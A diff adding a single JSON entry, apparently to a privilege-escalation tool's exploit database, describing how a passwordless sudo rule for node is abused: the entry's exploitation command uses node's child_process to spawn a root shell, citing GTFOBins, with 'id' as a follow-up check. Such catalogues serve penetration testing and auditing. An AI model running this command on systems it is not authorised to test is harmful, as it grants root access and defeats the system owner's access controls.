@@ -1,0 +1,1 @@
+{"id":"sudo_node","category":"SUDO_NOPASSWD_CUSTOM","binary":"node","cve":null,"exploitation":["sudo {{binary}} -e 'require(\"child_process\").spawn(\"{{shell}}\", {stdio: [0, 1, 2]})'"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins"],"severity":"high"}
